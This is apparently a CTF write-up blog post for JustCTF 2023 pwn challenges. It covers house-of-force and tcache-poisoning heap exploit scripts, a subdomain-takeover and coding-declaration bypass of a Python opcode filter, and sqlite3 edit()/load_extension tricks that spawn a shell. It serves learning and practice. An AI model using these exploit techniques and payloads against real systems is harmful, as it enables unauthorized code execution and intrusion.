@@ -1,0 +1,392 @@
+---
+title: "JustCTF 2023 Writeup"
+tags: ['Writeup', 'Pwn']
+draft: false
+date: "2023-06-03"
+summary: "Over the weekend, I made headway with several pwn challenges in Just CTF. One particularly instructive challenge required us to exploit the sqlite3 database using the command-line interface. Confronting and pwning a complex, large binary has always been a struggle for me. To learn from these challenges, I compiled several solutions, specifically focusing on identifying the ideal starting points for such tasks."
+---
+
+Over the weekend, I made headway with several pwn challenges in Just CTF. One particularly instructive challenge required us to exploit the sqlite3 database using the command-line interface. Confronting and pwning a complex, large binary has always been a struggle for me. To learn from these challenges, I compiled several solutions, specifically focusing on identifying the ideal starting points for such tasks.
+
+
+
+## Pwn
+
+### Welcome in my house
+
+In this challenge, we are presented with a scenario that involves several malloc operations, each followed by heap overflows. However, we are not allowed to free any chunks. Our primary objective is to overwrite the content of a pre-malloced chunk situated at a lower address. Together with the provided glibc library is in 2.27 version, I am pretty sure that this challenge requires using an old but dominant heap exploitation: **house of force**,  which has been patched in 2.29. 
+
+**house of force**
+
+Here is the PoC to illustrate the core concept of this technique:
+
+>  https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_force.c
+
+```
+sh = start()
+
+### 1st Round: exploit the house of force
+sh.recvuntil(b">>  ")
+sh.sendline(b"1")
+
+### first malloc and second malloc
+### overwrite top chunk size to 0xffffffff
+sh.recvuntil(b"Enter username: ")
+sh.sendline(b"A"*0x18+b'\xff'*0x8)
+
+### third malloc
+### input the root
+sh.recvuntil(b"Enter password: ")
+sh.sendline(b"root\x00")
+
+### fourth malloc
+### exploit the house of force
+pause()
+sh.recvuntil(b"Enter disk space: ")
+eval_size = 0x603260-0x6032e0-(0x8*4)
+sh.sendline(str(eval_size))
+
+### 2nd Round: read the flag
+sh.recvuntil(b">>  ")
+sh.sendline(b"2")
+
+sh.interactive()
+```
+
+![house-1](/static/images/justCTF-2023-Writeup/house-1.png)
+
+### nucleus
+
+This challenge offers us functionalities for both compressing and decompressing strings of our choice. We're granted the capability to free chunks containing compressed or decompressed strings, and we're able to print the contents of these chunks even after they've been freed. This indicates the presence of a Use-After-Free (UAF) vulnerability. However, we're limited to a total of 9 compression/decompression operations.
+
+The compression and decompression procedures can be seen as folding or unfolding repeated characters. For instance, `compress('AAAABBBB') => '$4A$4B'`.
+
+Another vulnerability manifests itself during the decompression process. The logic assumes that our decompressed string won't exceed twice the length of the original input string. However, we can easily provide an input string that exceeds this length, leading to heap overflow.
+
+![nuclecus-2](/static/images/justCTF-2023-Writeup/nuclecus-2.png)
+
+**leak the glibc**
+
+Typically, there are several ways to leak the glibc address. Given that this binary contains a UAF vulnerability, the easiest way might be to malloc and free a large chunk that's beyond the maximum holding size of the tcache (0x400+0x10), causing it to be placed in the unsorted bins. The freed chunk in unsorted bins would contain a `fd` pointer that points to the unsorted bin structure in glibc. We should also malloc a small chunk nearby in memory to our malloced big chunk to prevent consolidation between our malloced large chunk and the top chunk before freeing it.
+
+```
+def leak_glibc():
+    id = compress(b"A"*0x210)
+    id2 = compress(b"C"*0x10)
+    free(b'c', id)
+    raw_glibc_addr = printf(id)
+    glibc_base = get_leaked_addr_raw(raw_glibc_addr, 0, 8) - 0x1ECBE0
+    free_hook_addr = Libc.symbols['__free_hook'] + glibc_base
+    one_gadget_addr = glibc_base + 0xe3b01
+
+    log.info(f"leak glibc base: {hex(glibc_base)}")
+    log.info(f"free_hook_addr: {hex(free_hook_addr)}")
+    log.info(f"one_gadget_addr: {hex(one_gadget_addr)}")
+
+    """
+        One gadgets:
+        0xe3b01
+    """
+
+    return glibc_base, free_hook_addr, one_gadget_addr
+```
+
+However, we can also achieve arbitrary address read via tcache poisoning and start from the heap region, pivoting around the entire memory layout through the pointer we found.
+
+**Inferring the glibc version**
+
+The challenge doesn't provide the glibc library. Nevertheless, we can infer the glibc version on the remote server by observing its behavior. After confirming that the binary on the remote server does not have safe-linking pointer protection and has tcache in place, we can conclude that the glibc version would be between 2.27 and 2.31. We can then try each version individually.
+
+Another clever approach is to identify the underlying Ubuntu version, as the glibc version is tied to the Linux version. Based on Ubuntu 20.04, we can deduce that the glibc version should be 2.31.
+
+```
+strings nucleus | grep Ubuntu
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
+```
+
+**get shell**
+
+We can perform an arbitrary address write by leveraging tcache poisoning. As the glibc version is 2.31, which still has the `_malloc_hook` and `_free_hook`, we can gain shell access by overwriting the one-gadget address in the glibc to one of the hooks.
+
+```
+sh = start()
+comp_idx = 0
+decomp_idx = 0
+free_idx = 0
+
+def menu(idx):
+    sh.sendlineafter("> ", str(idx).encode())
+
+def compress(text):
+    global comp_idx
+    menu(1)
+    sh.sendlineafter(b"Enter text: ", text)
+    sh.recvuntil(b"compressed text: ")
+    log.info(f"compressed text: {sh.recvline()}")
+
+    comp_idx += 1
+    return comp_idx - 1
+
+def decompress(text):
+    global decomp_idx
+    menu(2)
+    sh.sendlineafter(b"Enter compressed text: ", text)
+    sh.recvuntil(b"decompressed text:")
+    log.info(f"decompressed text: {sh.recvline()[:-1]}")
+
+    decomp_idx += 1
+    return decomp_idx - 1
+
+def free(choice, idx):
+    menu(3)
+    sh.sendlineafter(b"Compress or decompress slot? (c/d): ", choice)
+    sh.sendlineafter(b"Idx: ", str(idx).encode())
+
+def printf(idx):
+    """
+        idx in compressed data array
+    """
+    menu(5)
+    sh.sendlineafter(b"Idx: ", str(idx).encode())
+    sh.recvuntil(b"content: ")
+    content = sh.recvline()[:-1]
+    return content
+
+def exit():
+    menu(4)
+
+def arbitrary_addr_write(addr, val):
+    """
+        specific to write an pointer(8 bytes) to target address
+    """
+    id0 = compress(b"A"*0x10) # 0x10
+    id1 = compress(b"B"*0x10) # 0x10
+    id2 = compress(b"C"*0x10) # 0x10
+    free(b"c", id2)
+    free(b"c", id1)
+    free(b"c", id0)
+
+    ### decompress
+    ### 1/ after decompress, it should be 0x30+target_addr to overflow the next chunk
+    ### 2/ payload length should be 0x10
+    ### this should overflow the chunk id1 in the free list
+    payload1 = b"ABCD$44A"+p64(addr-0x10)
+    d_id4 = decompress(payload1)
+
+    pause()
+    id3 = compress(b"D"*0x10) # 0x20
+    payload2 = b"AAAA$12A"+val
+    d_id1 = decompress(payload2) # 0x20
+
+def leak_glibc():
+    id = compress(b"A"*0x210)
+    id2 = compress(b"C"*0x10)
+    free(b'c', id)
+    raw_glibc_addr = printf(id)
+    glibc_base = get_leaked_addr_raw(raw_glibc_addr, 0, 8) - 0x1ECBE0
+    free_hook_addr = Libc.symbols['__free_hook'] + glibc_base
+    one_gadget_addr = glibc_base + 0xe3b01
+
+    log.info(f"leak glibc base: {hex(glibc_base)}")
+    log.info(f"free_hook_addr: {hex(free_hook_addr)}")
+    log.info(f"one_gadget_addr: {hex(one_gadget_addr)}")
+
+    """
+        One gadgets:
+        0xe3b01
+    """
+
+    return glibc_base, free_hook_addr, one_gadget_addr
+
+
+if __name__ == "__main__":
+    # arbitrary_addr_read(0x0, True)
+    glibc_base, free_hook_addr, one_gadget_addr = leak_glibc()
+    arbitrary_addr_write(free_hook_addr, p64(one_gadget_addr))
+    
+    pause()
+    free(b"c", free_idx) # this call the free hook
+
+    sh.interactive()
+
+```
+
+![nuclecus-1](/static/images/justCTF-2023-Writeup/nuclecus-1.png)
+
+### Pyplugins
+
+This challenge allows to download the python code from the internet and run locally after several validation as follows. 
+
+1. It only allows requesting the code from three trust domains: `blackhat.day`, `veganrecipes.soy`, and `fizzbuzz.foo`. 
+
+2. It will compile our provided code into opcodes and check whether there are invalid opcodes(it only allows: "LOAD_CONST", "STORE_NAME", "RETURN_VALUE").
+
+```
+### Code copied from Pwntools safeeval lib
+# see https://github.com/Gallopsled/pwntools/blob/c72886a9b9/pwnlib/util/safeeval.py#L26-L67
+# we did a small modification: we pass 'exec' instead of 'eval' to `compile`
+def _get_opcodes(codeobj):
+    if hasattr(dis, 'get_instructions'):
+        return [ins.opcode for ins in dis.get_instructions(codeobj)]
+    i = 0
+    opcodes = []
+    s = codeobj.co_code
+    while i < len(s):
+        code = six.indexbytes(s, i)
+        opcodes.append(code)
+        if code >= dis.HAVE_ARGUMENT:
+            i += 3
+        else:
+            i += 1
+    return opcodes
+
+def test_expr(expr, allowed_codes):
+    allowed_codes = [dis.opmap[c] for c in allowed_codes if c in dis.opmap]
+    try:
+        c = compile(expr, "", "exec")
+    except SyntaxError:
+        raise ValueError("%r is not a valid expression" % expr)
+    codes = _get_opcodes(c)
+    for code in codes:
+        if code not in allowed_codes:
+            raise ValueError("opcode %s not allowed" % dis.opname[code])
+    return c
+
+ALLOWED_OPCODES = ["LOAD_CONST", "STORE_NAME", "RETURN_VALUE"]
+```
+
+**subdomain hijacking**
+
+Here are several good material to hijack the subdomain of the domain hosting on the Github pages. 
+
+> https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/domain-subdomain-takeover.md
+>
+> https://ctf.zeyu2001.com/2021/uiuctf-2021/yana
+
+When setting up a new domain on a web hosting provider (like AWS, GitHub, etc.), one might use a wildcard CNAME record (e.g., `*.adomain.com`) that points to a certain location, like a user-specific domain such as `developer.github.io`. This means that any subdomain of `adomain.com` that doesn't have a more specific DNS record will resolve to `developer.github.io`.
+
+If an attacker is then able to add a more specific CNAME record, such as `xxx.adomain.com`, pointing to their own domain (`attacker.github.io`), this new record will take precedence over the wildcard record for `*.adomain.com`. This is because DNS resolution prioritizes more specific records over less specific ones.
+
+So, when a user tries to visit `xxx.adomain.com`, the DNS server will return the IP address associated with `attacker.github.io` instead of `developer.github.io`. This means that the user will be taken to the attacker's site rather than the originally intended site.
+
+**opcode validation bypass**
+
+I would say that subdomain hijacking related challenges are easy to solve as we could dig these subdomain created by other teams and find their payload before them delete them.
+
+I found this one from the `peko.blackhat.day` subdomain which uses the `#coding: raw_unicode_escape` to specify the encoding of the py file.
+
+```
+#coding: raw_unicode_escape x='PEKO\u0027\u002b\u0062\u0072\u0065\u0061\u006b\u0070\u006f\u0069\u006e\u0074\u0028\u0029\u002b\u0027'
+```
+
+Without the first comment, the py file would be interpreted as a simple store statement: `x= 'PEKO\'+breakpoint()+\''` as all the unicode will be escaped as string. However, if we specify the encoding at the very beginning, the code will be decoded first and then executed. And the breakpoint call would give us an interactive shell.
+
+![pyplugin-1](/static/images/justCTF-2023-Writeup/pyplugin-1.png)
+
+### notabug & notabug2
+
+In this challenge, we need to exploit the `splite3` which is a complex binary through the cli. The binary has been run through the following command which bans all the dot helper command in the sqlite expect `.open`.
+
+```
+sed -ue '/^\./ { /^\.open/!d; }' | ./sqlite3 -interactive
+```
+
+In the first version of the challenge, called 'notabug1', we're permitted to write to the disk. However, we are banned to do so in the second version due to the jail configuration.
+
+There are several solutions that have been shared by other players, and they can be broadly divided into two categories:
+
+1. Exploiting the features of SQLite3 to execute a binary.
+2. Using traditional 'pwn' techniques: identifying vulnerabilities in the binary and exploiting them.
+
+#### using edit func from @Mastho
+
+From the [official document](https://www.sqlite.org/cli.html), section 8.4 tell us that when using edit function, we could pass an editor program to process the input text. Since the readflag binary would print out the flag, we could use this feature to load the binary and get the flag.
+
+```
+sqlite> .open :memory:
+sqlite> CREATE TABLE t(a INT, b VARCHAR(200));
+sqlite> insert into t values (0, '');
+sqlite> update t set b=edit('','/jailed/readflag') where a=0;
+sqlite> select * from t;
+```
+
+#### using read/write file + load_extension @n132
+
+I also thought about this way to get a local binary executed since `load_extension` is a well known trick in the sqlite3 cheatsheet. However, I overlooked this function as it is an old feature and has been turned out by default. Sadly, it turns out that this old thing still works at this time.
+
+Since load_extension can only get dynamic library (.so) file loaded, we need to write our own `exp.so` which will call the ./readflag binary inside.
+
+In the 8.3 section of the [official document](https://www.sqlite.org/cli.html), it tells us the file IO related methods which allows us write the binary content to the memory and save it into the `exp.so` file.
+
+Here is the solution from n132: https://n132.github.io/2023/05/31/JustCTF-notabug.html
+
+And here is even an exec module for sqlite3: https://github.com/mpaolino/sqlite-execute-module
+
+#### pwn the binary with heap bruteforce @김진우 and @n132
+
+Their solution can be found at their blogs: [@김진우](https://uz56764.tistory.com/103) and [@n132](https://n132.github.io/2023/05/31/JustCTF-notabug.html).
+
+One thing I have learned from this challenge is that when analyzing complex binary, **we need to concretized the high-level behaviors(e.g. select from a database or load extensions) to specific operations (e.g. print or read+execute)**.
+
+```
+int sqlite3_load_extension(
+  sqlite3 *db,          /* Load the extension into this database connection */
+  const char *zFile,    /* Name of the shared library containing extension */
+  const char *zProc,    /* Entry point.  Derived from zFile if 0 */
+  char **pzErrMsg       /* Put error message here if not 0 */
+);
+```
+
+>This interface loads an SQLite extension library from the named file.
+>
+>The sqlite3_load_extension() interface attempts to load an [SQLite extension](https://www.sqlite.org/loadext.html) library contained in the file zFile. If the file cannot be loaded directly, attempts are made to load with various operating-system specific extensions added. So for example, if "samplelib" cannot be loaded, then names like "samplelib.so" or "samplelib.dylib" or "samplelib.dll" might be tried also.
+>
+>The entry point is zProc. zProc may be 0, in which case SQLite will try to come up with an entry point name on its own. It first tries "sqlite3_extension_init". If that does not work, it constructs a name "sqlite3_X_init" where the X is consists of the lower-case equivalent of all ASCII alphabetic characters in the filename from the last "/" to the first following "." and omitting any initial "lib". The sqlite3_load_extension() interface returns [SQLITE_OK](https://www.sqlite.org/rescode.html#ok) on success and [SQLITE_ERROR](https://www.sqlite.org/rescode.html#error) if something goes wrong. If an error occurs and pzErrMsg is not 0, then the [sqlite3_load_extension()](https://www.sqlite.org/c3ref/load_extension.html) interface shall attempt to fill *pzErrMsg with error message text stored in memory obtained from [sqlite3_malloc()](https://www.sqlite.org/c3ref/free.html). The calling function should free this memory by calling [sqlite3_free()](https://www.sqlite.org/c3ref/free.html).
+
+Their description would lead us thinking that it is trying to execute the entry function which is under user controlled.
+
+Upon reviewing their [source code](https://sqlite.org/src/file?name=src/loadext.c&ci=trunk), we could find that they first use DlSym to locate the entry point address and then it will call that address(in the sqlite3LoadExtension function).
+
+![notabug-1](/static/images/justCTF-2023-Writeup/notabug-1.png)
+
+Therefore, we could leverage this feature to print or read something by calling puts and gets. Since the argument of `xInit` is `db`, we are able to leak or overwrite the content on this heap chunk(who le heap region).
+
+If we input `select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts');`, we could found that when calling the puts, the rdi reg points to an heap address where the content is an instruction address. Therefore, we could leak the PIE (elf loading address).
+
+![notabug-1](/static/images/justCTF-2023-Writeup/notabug-2.png)
+
+Next, since we are able to control the content of `db`, we need to find a call site where the function pointer and argument are both under control.
+
+![notabug-4](/static/images/justCTF-2023-Writeup/notabug-4.png)
+
+In the same function, we could find a function call that quite fit our requirement. The memory layout during the call is shown as follows. Since we are able to overwrite the `db` chunk by calling `select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','gets');`.
+
+![notabug-5](/static/images/justCTF-2023-Writeup/notabug-5.png)
+
+Our immediate thoughts would create a fake pVfs chunk, putting '/bin/sh' on the pVfs and system addr on the pVfs+0x48. Then finally overwrite db with the fake chunk's address.
+
+However, in their exploit, they try to achieve something much smarter.
+
+**call gadgets**
+
+When call instruction has been executed, we could found the program state that several registers are containing our input. So why don't we try to call an gadgets address whose instructions are `mov rdi, rax; call system` instead of the `system@plt` directly. In this case, we could send "/bin/sh" as the second argument and will pass to the rdi reg when system function call has been made.
+
+So, our solution would look like this:
+![notabug-6](/static/images/justCTF-2023-Writeup/notabug-6.png)
+
+The only problem is that we need overwrite the address `db` with the content `db-0x48+0x10` which is a heap address. Since we can only leak the elf loading address. We need to brute force the heap address and the when chance is 1/2000.
+
+The core exploit lines are: 
+
+```
+p.sendline(b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','gets');")
+p.sendline(p64(heapDB-0x48+0x10)+b'a'*0x8+p64(call_sys_gadget)))
+
+p.sendline(b"select Load_extension('"+p64(system_plt)[:6]+b"','/bin/sh');")
+```
+
+#### pwn the binary with heap spray @Zafirr
+
+heap spray: https://discord.com/channels/656258740252704788/1115043902135734272/1115051866632486992
+
+Like mentioned in the above solution, we could also create a fake pVfs chunk and place `"/bin/sh"` and `system@plt` according. Since we cannot leak the heap address, we could leverage the heap spray to greatly increase our success chance.
